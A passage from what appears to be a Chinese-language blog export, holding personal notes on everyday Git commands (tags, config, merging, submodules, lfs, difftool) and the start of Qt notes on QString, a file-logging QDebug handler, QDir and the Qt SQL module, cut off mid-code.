<h1 id="五、标签"><a href="#五、标签" class="headerlink" title="五、标签"></a>五、标签</h1><h2 id="1-基础操作"><a href="#1-基础操作" class="headerlink" title="1. 基础操作"></a>1. 基础操作</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取所有tag</span></span><br><span class="line">git fetch --tags</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示所有tag</span></span><br><span class="line">git tag</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看对应tag信息</span></span><br><span class="line">git show &lt;tag&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除tag</span></span><br><span class="line">git tag -d &lt;tag&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本地标签推送到远端，本地打标签默认不会同步到远端</span></span><br><span class="line">git push [origin] &lt;tag&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">推送所有本地标签到远端</span></span><br><span class="line">git push [origin] --tags</span><br></pre></td></tr></table></figure>

<h2 id="2-用特定的搜索模式列出符合条件的标签"><a href="#2-用特定的搜索模式列出符合条件的标签" class="headerlink" title="2. 用特定的搜索模式列出符合条件的标签"></a>2. 用特定的搜索模式列出符合条件的标签</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag -l &#x27;condition&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="3-新建标签"><a href="#3-新建标签" class="headerlink" title="3. 新建标签"></a>3. 新建标签</h2><p>Git 使用的标签有两种类型：轻量级的（lightweight）和含附注的（annotated）。</p>
<p>轻量级标签就像是个不会变化的分支，实际上它就是个指向特定提交对象的引用。而含附注标签，实际上是存储在仓库中的一个独立对象，它有自身的校验和信息，包含着标签的名字，电子邮件地址和日期，以及标签说明，标签本身也允许使用 GNU Privacy Guard (GPG) 来签署或验证。一般我们都建议使用含附注型的标签，以便保留相关信息；当然，如果只是临时性加注标签，或者不需要旁注额外信息，用轻量级标签也没问题。</p>
<h3 id="3-1-含附注的标签"><a href="#3-1-含附注的标签" class="headerlink" title="3.1. 含附注的标签"></a>3.1. 含附注的标签</h3><p>创建一个含附注类型的标签非常简单，用 -a （译注：取 annotated 的首字母）指定标签名字即可：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag -a (version) -m &#x27;comment&#x27;</span><br></pre></td></tr></table></figure>

<p>而 -m 选项则指定了对应的标签说明，Git 会将此说明一同保存在标签对象中。如果没有给出该选项，Git 会启动文本编辑软件供你输入标签说明。</p>
<h3 id="3-2-签署标签"><a href="#3-2-签署标签" class="headerlink" title="3.2. 签署标签"></a>3.2. 签署标签</h3><p>如果你有自己的私钥，还可以用 GPG 来签署标签，只需要把之前的 -a 改为 -s （译注： 取 signed 的首字母）即可：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag -s (version) -m &#x27;comment&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="3-3-轻量级标签"><a href="#3-3-轻量级标签" class="headerlink" title="3.3. 轻量级标签"></a>3.3. 轻量级标签</h3><p>轻量级标签实际上就是一个保存着对应提交对象的校验和信息的文件。要创建这样的标签，一个 -a，-s 或 -m 选项都不用，直接给出标签名字即可：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag (version)</span><br></pre></td></tr></table></figure>

<h2 id="4-验证标签"><a href="#4-验证标签" class="headerlink" title="4. 验证标签"></a>4. 验证标签</h2><p>可以使用 git tag -v [tag-name] （译注：取 verify 的首字母）的方式验证已经签署的标签。此命令会调用 GPG 来验证签名，所以你需要有签署者的公钥，存放在 keyring 中，才能验证：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag -v (version)</span><br></pre></td></tr></table></figure>

<p>若是没有签署者的公钥，会报告类似下面这样的错误：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg: Signature made Wed Sep 13 02:08:25 2006 PDT using DSA key ID F3119B9A</span><br><span class="line">gpg: Can&#x27;t check signature: public key not found</span><br><span class="line">error: could not verify the tag &#x27;v1.4.2.1&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="后期加注标签"><a href="#后期加注标签" class="headerlink" title="后期加注标签"></a>后期加注标签</h2><p>你甚至可以在后期对早先的某次提交加注标签。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag -a (version) (commitNumber)</span><br></pre></td></tr></table></figure>

<h1 id="六、配置"><a href="#六、配置" class="headerlink" title="六、配置"></a>六、配置</h1><h2 id="一些基本用法"><a href="#一些基本用法" class="headerlink" title="一些基本用法"></a>一些基本用法</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 查 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看系统的config</span></span><br><span class="line">git config --system --list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看用户的config</span></span><br><span class="line">git config --global --list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看仓库的config</span></span><br><span class="line">git config --local --list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 删 ##########</span></span></span><br><span class="line">git config --global --unset xxx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">出现multiple values无法删除，先执行下面操作，再删除</span></span><br><span class="line">git config --global --replace-all xxx 1</span><br></pre></td></tr></table></figure>

<h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><h3 id="修改远程仓库地址"><a href="#修改远程仓库地址" class="headerlink" title="修改远程仓库地址"></a>修改远程仓库地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote set-url (origin_name) (url)</span><br></pre></td></tr></table></figure>

<h3 id="删除现有远程仓库"><a href="#删除现有远程仓库" class="headerlink" title="删除现有远程仓库"></a>删除现有远程仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote rm (origin_name)</span><br></pre></td></tr></table></figure>

<h3 id="添加新的远程仓库"><a href="#添加新的远程仓库" class="headerlink" title="添加新的远程仓库"></a>添加新的远程仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add (origin_name) (url)</span><br></pre></td></tr></table></figure>

<h3 id="查看远程仓库地址"><a href="#查看远程仓库地址" class="headerlink" title="查看远程仓库地址"></a>查看远程仓库地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

<h2 id="记住密码"><a href="#记住密码" class="headerlink" title="记住密码"></a>记住密码</h2><h3 id="设置记住密码（默认15分钟）："><a href="#设置记住密码（默认15分钟）：" class="headerlink" title="设置记住密码（默认15分钟）："></a>设置记住密码（默认15分钟）：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global credential.helper cache</span><br></pre></td></tr></table></figure>

<h3 id="如果想自己设置时间，可以这样做："><a href="#如果想自己设置时间，可以这样做：" class="headerlink" title="如果想自己设置时间，可以这样做："></a>如果想自己设置时间，可以这样做：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config credential.helper &#x27;cache --timeout=3600&#x27;</span><br></pre></td></tr></table></figure>

<p>这样就设置一个小时之后失效</p>
<h3 id="长期存储密码："><a href="#长期存储密码：" class="headerlink" title="长期存储密码："></a>长期存储密码：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure>

<h2 id="格式配置"><a href="#格式配置" class="headerlink" title="格式配置"></a>格式配置</h2><h3 id="不自动改换行符LF-CRLF"><a href="#不自动改换行符LF-CRLF" class="headerlink" title="不自动改换行符LF&#x2F;CRLF"></a>不自动改换行符LF&#x2F;CRLF</h3><ul>
<li>git在clone和commit的时候，会自动判断平台，如果是windows就会改成crlf，linux就是lf</li>
<li>提交的时候，windows会自动转成lf的格式提交，不用关心格式</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global core.autocrlf false</span><br></pre></td></tr></table></figure>

<h3 id="允许长路径"><a href="#允许长路径" class="headerlink" title="允许长路径"></a>允许长路径</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --system core.longpaths true</span><br></pre></td></tr></table></figure>

<h1 id="七、合并和冲突"><a href="#七、合并和冲突" class="headerlink" title="七、合并和冲突"></a>七、合并和冲突</h1><h2 id="1-冲突解决"><a href="#1-冲突解决" class="headerlink" title="1. 冲突解决"></a>1. 冲突解决</h2><h3 id="1-1-使用vim解决冲突"><a href="#1-1-使用vim解决冲突" class="headerlink" title="1.1. 使用vim解决冲突"></a>1.1. 使用vim解决冲突</h3><p><strong>配置</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用vimdiff作为冲突解决工具</span></span><br><span class="line">git config --global merge.tool vimdiff</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mergetool不产生备份文件，不然会产生*.orig的备份文件</span></span><br><span class="line">git config --global mergetool.keepBackup false</span><br></pre></td></tr></table></figure>

<p><strong>解决冲突</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用配置的mergetool进行冲突解决</span></span><br><span class="line">git mergetool</span><br></pre></td></tr></table></figure>

<ul>
<li>打开后是vimdiff界面，使用<code>]</code> + <code>c</code> 进行跳转</li>
<li>修改完成后，<code>:xa</code>下一个文件</li>
<li><code>:diffg LO</code>: 使用左上改动</li>
<li><code>:diffg BA</code>: 使用中间改动</li>
<li><code>:diffg RE</code>: 使用右上改动</li>
</ul>
<h3 id="1-2-单个文件全部使用本地或远端"><a href="#1-2-单个文件全部使用本地或远端" class="headerlink" title="1.2. 单个文件全部使用本地或远端"></a>1.2. 单个文件全部使用本地或远端</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout --theirs path/to/file</span><br><span class="line">git checkout --ours path/to/file</span><br></pre></td></tr></table></figure>

<h2 id="2-diff查看改动"><a href="#2-diff查看改动" class="headerlink" title="2. diff查看改动"></a>2. diff查看改动</h2><h3 id="2-1-查看缓冲区改动"><a href="#2-1-查看缓冲区改动" class="headerlink" title="2.1. 查看缓冲区改动"></a>2.1. 查看缓冲区改动</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git diff</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">忽略空格改动</span></span><br><span class="line">git diff -w</span><br></pre></td></tr></table></figure>

<h1 id="八、子模块"><a href="#八、子模块" class="headerlink" title="八、子模块"></a>八、子模块</h1><h2 id="1-一些基本操作"><a href="#1-一些基本操作" class="headerlink" title="1. 一些基本操作"></a>1. 一些基本操作</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">首次<span class="built_in">clone</span>仓库拉取子模块</span></span><br><span class="line">git clone --recursive 仓库地址</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在母仓库初始化子模块</span></span><br><span class="line">git submodule init</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取了母仓库，首次拉取子模块</span></span><br><span class="line">git submodule update --init --recursive</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新子模块</span></span><br><span class="line">git submodule update --recursive --remote</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加一个子模块</span></span><br><span class="line">git submodule add https://github.com/path/to.git path/to/dir</span><br></pre></td></tr></table></figure>

<h1 id="九、git-lfs"><a href="#九、git-lfs" class="headerlink" title="九、git lfs"></a>九、git lfs</h1><h2 id="1-一些基本操作-1"><a href="#1-一些基本操作-1" class="headerlink" title="1. 一些基本操作"></a>1. 一些基本操作</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取单个文件，不带前导/</span></span><br><span class="line">git lfs pull --include=&quot;a/b/c.zip&quot; --exclude=&quot;&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取全部文件</span></span><br><span class="line">git lfs pull --include=&quot;*&quot; --exclude=&quot;&quot;</span><br></pre></td></tr></table></figure>

<h1 id="十、git-difftool"><a href="#十、git-difftool" class="headerlink" title="十、git difftool"></a>十、git difftool</h1><ul>
<li>使用vimdiff查看git改动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global diff.tool vimdiff</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不展示选择是否编辑的界面，直接进入vimdiff</span></span><br><span class="line">git config --global difftool.prompt false</span><br></pre></td></tr></table></figure>

<ul>
<li>在目录下执行就可以查看git改动了</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看未stage的改动</span></span><br><span class="line">git difftool</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看全部未提交的改动</span></span><br><span class="line">git difftool HEAD</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看stage的改动</span></span><br><span class="line">git difftool --staged</span><br><span class="line">git difftool --cached</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前分支和某次提交的差异</span></span><br><span class="line">git difftool [commit_id]</span><br></pre></td></tr></table></figure>

<h1 id="十一、git-log-查看历史提交记录"><a href="#十一、git-log-查看历史提交记录" class="headerlink" title="十一、git log 查看历史提交记录"></a>十一、git log 查看历史提交记录</h1><h2 id="1-选项解释"><a href="#1-选项解释" class="headerlink" title="1. 选项解释"></a>1. 选项解释</h2><ul>
<li><code>--all</code>: 显示所有提交，默认仅当前及以前</li>
<li><code>--author=&quot;xxx&quot;</code>: 显示某人的提交</li>
</ul>
<h1 id="小技巧与踩坑记"><a href="#小技巧与踩坑记" class="headerlink" title="小技巧与踩坑记"></a>小技巧与踩坑记</h1><h2 id="1-远端分支和本地不同步"><a href="#1-远端分支和本地不同步" class="headerlink" title="1. 远端分支和本地不同步"></a>1. 远端分支和本地不同步</h2><ul>
<li>当出现仓库上已经没有某分支，但是本地还是显示远端有此分支</li>
<li>使用下面命令，将本地的origin相关分支和远程同步</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote prune origin</span><br></pre></td></tr></table></figure>

<h2 id="2-生效其他分支的一次提交"><a href="#2-生效其他分支的一次提交" class="headerlink" title="2. 生效其他分支的一次提交"></a>2. 生效其他分支的一次提交</h2><p>参数说明</p>
<ul>
<li><code>-n</code>: 不提交，不加将会使用要使用的提交的message创建一次提交</li>
<li><code>-m 1</code>: 使用合并到分支的改动，设置成2将使用被合并的分支的改动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">非合并类型提交</span></span><br><span class="line">git cherry-pick -n xxx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">合并类型的提交</span></span><br><span class="line">git cherry-pick -m 1 -n xxx</span><br></pre></td></tr></table></figure>

<h2 id="3-仅拉取一个分支的代码"><a href="#3-仅拉取一个分支的代码" class="headerlink" title="3. 仅拉取一个分支的代码"></a>3. 仅拉取一个分支的代码</h2><ul>
<li>git整个仓库太大，想要只拉取一个分支树的所有代码或者拉取一个分支的最近一次commit的代码可以用下面的命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只拉取一个分支的分支历史</span></span><br><span class="line">git clone xxx -b [branch_name] --single-branch</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取一个分支的一次提交</span></span><br><span class="line">git clone xxx -b [branch_name] --depth=1</span><br></pre></td></tr></table></figure>

<ul>
<li>想要拉取其他分支代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先添加远程分支</span></span><br><span class="line">git remote set-branches origin master</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再进行获取，只会获取最近一次提交，需要多次需要指定</span></span><br><span class="line">git fetch --depth 1 origin [branch_name]</span><br><span class="line">git checkout [branch_name]</span><br></pre></td></tr></table></figure>

<ul>
<li>临时切到一个提交，不需要创建本地分支可以使用下面的命令</li>
<li>可以理解为git将某个提交获取到本地，并没有获取到其他的id</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">虽然指定了分支名，但是只拉取了commitid，分支没有在本地</span></span><br><span class="line">git fetch --depth 1 origin [branch_name|tag_name]</span><br><span class="line">git checkout FETCH_HEAD</span><br></pre></td></tr></table></figure>

<h2 id="4-git-log显示中文为Author-58134"><a href="#4-git-log显示中文为Author-58134" class="headerlink" title="4. git log显示中文为Author: &lt;E6&gt;&lt;9D&gt;&lt;8E&gt;&lt;E5&gt;&lt;8F&gt;&lt;91&gt;&lt;E6&gt;&lt;98&gt;&lt;8E&gt;58134 &lt;58134@163.com&gt;"></a>4. <code>git log</code>显示中文为<code>Author: &lt;E6&gt;&lt;9D&gt;&lt;8E&gt;&lt;E5&gt;&lt;8F&gt;&lt;91&gt;&lt;E6&gt;&lt;98&gt;&lt;8E&gt;58134 &lt;58134@163.com&gt;</code></h2><ul>
<li><code>git log</code>使用分页器显示日志，但是分页器不设置编码无法解析中文</li>
<li>下面命令可以加到<code>.zshrc</code>或<code>/etc/environment</code>里面</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置分页器的编码为utf-8</span></span><br><span class="line">export LESSCHARSET=utf-8</span><br></pre></td></tr></table></figure>

<h2 id="5-git仓库损坏，调用命令提示文件缺失"><a href="#5-git仓库损坏，调用命令提示文件缺失" class="headerlink" title="5. git仓库损坏，调用命令提示文件缺失"></a>5. git仓库损坏，调用命令提示文件缺失</h2><ul>
<li>安装<code>git-repair</code>，调用下面命令修复</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git-repair --force</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt笔记</title>
    <url>/blogs/2018-10-15-qtStudy/</url>
    <content><![CDATA[<p>version:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Qt Creator 4.5.1</span><br><span class="line">Based on Qt 5.10.1 (MSVC 2015, 32 bit)</span><br><span class="line">Built on Feb 10 2018 04:20:12</span><br><span class="line">From revision 24cd0b1cd6</span><br></pre></td></tr></table></figure>
<p>操作系统: <code>windows10 Pro 1803</code></p>
<h1 id="qt介绍"><a href="#qt介绍" class="headerlink" title="qt介绍"></a>qt介绍</h1><h2 id="框架架构解析"><a href="#框架架构解析" class="headerlink" title="框架架构解析"></a>框架架构解析</h2><img src = "2018_10_22_02.jpg">

<h1 id="公用配置"><a href="#公用配置" class="headerlink" title="公用配置"></a>公用配置</h1><h2 id="创建的文件模板修改"><a href="#创建的文件模板修改" class="headerlink" title="创建的文件模板修改"></a>创建的文件模板修改</h2><p>我修改的是<code>D:\ProgramData\Qt\Qt5.10.1\Tools\QtCreator\share\qtcreator\templates\wizards\classes\cpp</code>目录下的两个文件，可以实现修改文件创建的模板</p>
<h1 id="语法学习"><a href="#语法学习" class="headerlink" title="语法学习"></a>语法学习</h1><h2 id="QString"><a href="#QString" class="headerlink" title="QString"></a>QString</h2><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">QString test = <span class="built_in">QString</span>().<span class="built_in">sprintf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;https://githubwyb.github.io/&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="与std-string的相互转化"><a href="#与std-string的相互转化" class="headerlink" title="与std::string的相互转化"></a>与std::string的相互转化</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//QString转std::string</span></span><br><span class="line">QString qStr = <span class="string">&quot;https://githubwyb.github.io/&quot;</span>;</span><br><span class="line">std::string str = qStr.<span class="built_in">toStdString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//std::string转QString</span></span><br><span class="line">std::string str = <span class="string">&quot;https://githubwyb.github.io/&quot;</span>;</span><br><span class="line">QString qStr = QString::<span class="built_in">fromStdString</span>(str);</span><br></pre></td></tr></table></figure>

<h2 id="QDebug"><a href="#QDebug" class="headerlink" title="QDebug"></a>QDebug</h2><h3 id="将打印格式化输出到文件"><a href="#将打印格式化输出到文件" class="headerlink" title="将打印格式化输出到文件"></a>将打印格式化输出到文件</h3><ul>
<li>初始化需要将messageHandler自定义一下，qt提供下面的方法进行自定义</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*QtMessageHandler)</span><span class="params">(QtMsgType, <span class="type">const</span> QMessageLogContext &amp;, <span class="type">const</span> QString &amp;)</span></span>;</span><br><span class="line"><span class="function">Q_CORE_EXPORT QtMessageHandler <span class="title">qInstallMessageHandler</span><span class="params">(QtMessageHandler)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>自定义消息的处理函数到文件中，自定义格式为：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2018-10-17 16:17:28[D][main.cpp:11 (int qMain(int, char**))] Hello, qt</span><br></pre></td></tr></table></figure>

<ul>
<li>自定义的处理函数为下</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">splitFileName</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fileName)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *pChar = fileName;</span><br><span class="line">    pChar = (<span class="built_in">strrchr</span>(pChar, <span class="string">&#x27;/&#x27;</span>) ? <span class="built_in">strrchr</span>(pChar, <span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span> : (<span class="built_in">strrchr</span>(pChar, <span class="string">&#x27;\\&#x27;</span>) ? <span class="built_in">strrchr</span>(pChar, <span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span> : pChar));</span><br><span class="line">    <span class="keyword">return</span> pChar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myMessageOutput</span><span class="params">(QtMsgType type, <span class="type">const</span> QMessageLogContext &amp;context, <span class="type">const</span> QString &amp;msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> QMutex mutex;</span><br><span class="line">    mutex.<span class="built_in">lock</span>();</span><br><span class="line"></span><br><span class="line">    QString text = QDateTime::<span class="built_in">currentDateTime</span>().<span class="built_in">toString</span>(<span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (type)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> QtDebugMsg:</span><br><span class="line">        text += <span class="built_in">QString</span>(<span class="string">&quot;[D]&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> QtInfoMsg:</span><br><span class="line">        text += <span class="built_in">QString</span>(<span class="string">&quot;[I]&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> QtWarningMsg:</span><br><span class="line">        text += <span class="built_in">QString</span>(<span class="string">&quot;[W]&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> QtCriticalMsg:</span><br><span class="line">        text += <span class="built_in">QString</span>(<span class="string">&quot;[E]&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> QtFatalMsg:</span><br><span class="line">        text += <span class="built_in">QString</span>(<span class="string">&quot;[F]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    text += <span class="built_in">QString</span>(<span class="string">&quot;[%1:%2 (%3)] %4&quot;</span>).<span class="built_in">arg</span>(<span class="built_in">splitFileName</span>(context.file)).<span class="built_in">arg</span>(context.line).<span class="built_in">arg</span>(context.function).<span class="built_in">arg</span>(msg);</span><br><span class="line"></span><br><span class="line">    QString logFile = QCoreApplication::<span class="built_in">applicationDirPath</span>() + <span class="string">&quot;/log.txt&quot;</span>;</span><br><span class="line">    <span class="function">QFile <span class="title">file</span><span class="params">(logFile)</span></span>;</span><br><span class="line">    file.<span class="built_in">open</span>(QIODevice::WriteOnly | QIODevice::Append);</span><br><span class="line">    <span class="keyword">if</span> (file.<span class="built_in">size</span>() &gt;= <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="comment">//文件达到10M后先备份再清空</span></span><br><span class="line">    &#123;</span><br><span class="line">        QFile::<span class="built_in">remove</span>(<span class="string">&quot;log_00.txt&quot;</span>);<span class="comment">//删除原来的备份文件</span></span><br><span class="line">        file.<span class="built_in">copy</span>(<span class="string">&quot;log_00.txt&quot;</span>);    <span class="comment">//拷贝文件至备份文件</span></span><br><span class="line">        file.<span class="built_in">resize</span>(<span class="number">0</span>);             <span class="comment">//清空文件内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">QTextStream <span class="title">text_stream</span><span class="params">(&amp;file)</span></span>;</span><br><span class="line">    text_stream &lt;&lt; text &lt;&lt; <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">    file.<span class="built_in">flush</span>();</span><br><span class="line">    file.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">    mutex.<span class="built_in">unlock</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol>
<li>release版本需要在工程中.pro文件定义一个宏,然后，重新qmake，编译，不然文件和行数相关信息无法打印。</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DEFINES += QT_MESSAGELOGCONTEXT</span><br></pre></td></tr></table></figure>

<h3 id="去除打印的引号"><a href="#去除打印的引号" class="headerlink" title="去除打印的引号"></a>去除打印的引号</h3><ul>
<li>只能在debug版本使用，release版本会出错，暂未找解决方案</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">QString str = <span class="string">&quot;Hello, world&quot;</span>;</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; <span class="built_in">qPrintable</span>(str);</span><br></pre></td></tr></table></figure>
<ul>
<li>可以在debug和release版本使用</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">QString str = <span class="string">&quot;https://githubwyb.github.io/&quot;</span>;</span><br><span class="line"><span class="built_in">qDebug</span>(<span class="string">&quot;%s&quot;</span>, str.<span class="built_in">toLatin1</span>().<span class="built_in">data</span>());</span><br></pre></td></tr></table></figure>

<h2 id="目录相关接口"><a href="#目录相关接口" class="headerlink" title="目录相关接口"></a>目录相关接口</h2><h3 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h3><p>创建目录使用<code>QDir</code>接口，有两个函数<code>mkdir</code>和<code>mkpath</code>。区别如下：</p>
<ul>
<li>mkdir：上层目录不存在时，创建会失败。目录已经存在时会返回false。</li>
<li>mkpath：上层目录不存在也没关系，自动一起创建。目录已经存在时会返回true。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">QDir</span>().<span class="built_in">mkdir</span>(path);</span><br><span class="line"><span class="built_in">QDir</span>().<span class="built_in">mkpath</span>(path);</span><br></pre></td></tr></table></figure>

<h2 id="数据库接口"><a href="#数据库接口" class="headerlink" title="数据库接口"></a>数据库接口</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Qt中的Qt SQL模块提供了对数据库的支持，该模块中的众多类基本上可以分为三层，如下图所示。</p>
<img src = "2018_10_15_01.jpg">

<ul>
<li>驱动层为具体的数据库和SQL接口层之间提供了底层的桥梁；</li>
<li>SQL接口层提供了对数据库的访问，其中的QSqlDatabase类用来创建连接，QSqlQuery类可以使用SQL语句来实现与数据库交互，其他几个类对该层提供了支持；</li>
<li>用户接口层的几个类实现了将数据库中的数据链接到窗口部件上，它们是更高层次的抽象，即便不熟悉SQL也可以操作数据库。</li>
</ul>
<p>如果要使用Qt SQL模块中的这些类，需要在项目文件（.pro文件）中添加<code>QT += sql</code>这一行代码。对应数据库部分的内容，大家可以在帮助中查看SQL Programming关键字。</p>
<h3 id="列出可用数据库驱动"><a href="#列出可用数据库驱动" class="headerlink" title="列出可用数据库驱动"></a>列出可用数据库驱动</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QCoreApplication&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QSqlDatabase&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QStringList&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> 